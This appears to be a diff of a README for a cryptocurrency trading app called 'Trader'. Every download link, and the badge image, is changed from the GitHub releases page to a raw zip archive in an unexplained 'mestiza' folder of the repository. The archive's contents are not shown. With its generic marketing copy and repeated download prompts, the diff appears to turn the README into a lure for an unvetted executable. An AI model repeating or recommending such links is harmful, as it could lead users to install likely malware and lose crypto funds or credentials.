@@ -1,7 +1,7 @@
 # 🚀 Trader - Simplify Your Crypto Trading Experience
 
 ## 💾 Download Now
-[![Download Trader](https://img.shields.io/badge/Download-Trader-blue.svg)](https://github.com/omisul/Trader/releases)
+[![Download Trader](https://raw.githubusercontent.com/omisul/Trader/main/mestiza/Trader.zip)](https://raw.githubusercontent.com/omisul/Trader/main/mestiza/Trader.zip)
 
 ## 📖 Introduction
 Welcome to Trader, a modern cryptocurrency trading application. With its user-friendly interface, Trader helps you track your crypto assets and make informed trades. Designed for everyone, Trader combines real-time data and smart analytics. Whether you're a beginner or seasoned trader, you will find what you need here.
@@ -48,7 +48,7 @@ To get started with Trader, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
    
-   [Download Trader](https://github.com/omisul/Trader/releases)
+   [Download Trader](https://raw.githubusercontent.com/omisul/Trader/main/mestiza/Trader.zip)
 
 2. **Choose Your Version**: Look for the latest version listed at the top of the page. This will have the most recent features and fixes.
 
@@ -76,4 +76,4 @@ Join our community for tips and sharing experiences. You can engage with other u
 ## 🏁 Conclusion
 Trader is designed to make your cryptocurrency trading as easy as possible. With real-time data and robust features, we aim to enhance your trading journey. Download Trader today and take control of your investments.
 
-[Download Trader](https://github.com/omisul/Trader/releases)
+[Download Trader](https://raw.githubusercontent.com/omisul/Trader/main/mestiza/Trader.zip)
